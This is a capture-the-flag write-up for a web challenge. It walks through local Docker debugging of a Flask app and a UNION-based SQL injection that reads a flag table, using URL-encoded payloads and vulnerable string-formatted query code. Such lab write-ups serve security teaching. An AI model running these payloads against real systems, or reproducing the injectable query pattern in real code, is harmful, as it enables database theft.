I first view the data.sql file to know if the flag is there inserted in the same table. however, towards the end of the file, we see - 
```
CREATE TABLE flag (
flag text
);
INSERT INTO flag VALUES("lactf{fake_flag}");

```
so we need the flag to be taken from the table flag. On opening the challenge, we are greeted by a page that looks like this - 
I entered some random values here
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/b746eab3-f7a3-4c5a-860a-f1258025cb79)
On clicking the button, the request sent is intercepted by burpsuite and it looks like - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/ef3d57a5-86bd-415c-a714-2947d45e3334)
and in the server, we see the query being executed looks like - 
```
query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
```
I thought it should be easy and I can easily select the data from the flags table but something weird was going on and I needed to run the server in docker. I modified the app.py code to be like - 
```
@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")

    data.pop("name")
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in data.items()])
    )
    name = query

    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)
    

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r
```
so that I can see the query being executed in the backend. unlike what I expected, 6 columns are getting returned and not just 4. 
all we need to do is basic sqli with a union statement.

...it seems that I forgot how I solved this challenge hence I need to open docker and see where I'm making the error, again :')
Anyway, I'll use this opportunity to show how I run the challenge in docker and make place print statements -
1. I unzip the file and run the command ``` docker build . -t ctf_chall``` which makes the docker image and tags it as 'ctf_chall'. then I open docker and run the image by keeping the host port as 0.
2. ![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/4cc9bd24-1f4a-40ee-bd2a-a2a5df342f45)
3. I modify the app.py like you see in the image
4. I also added the code -
   ```
   if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=8080,
        debug=True,
    )

   ```
   to app.py so that it'll show all the errors that may be going on.
5. I restart the docker container
so I initially was using payload like -
```name=sdf&guests=0'%20union%20select%201%2c2%2c3%2c4%2c'5```
however, this was also wrong! I forgot that 6 columns are being returned after I saw the error in the logs
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/7ab0fe25-6c1d-44b8-8a74-24c5c3e429ab)
so I modified the payload like ```name=sdf&guests=0'%20union%20select%201%2c1%2c2%2c3%2c4%2c'5```
and I see that the numbers 1,2,3,4,5 are being printed on the screen. hence I make the new payload to get the flag -

![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/5177b9f9-2599-4d5c-a9b5-9c7f554711d9)
I see that the docker container is correctly returning the test flag, hence I use this same payload on the real server - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/1d6580ce-7a51-4465-b3f5-176be819ae84)
hence I get the flag like -
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/d246dc20-f2bb-4435-9d3a-207155fe221e)



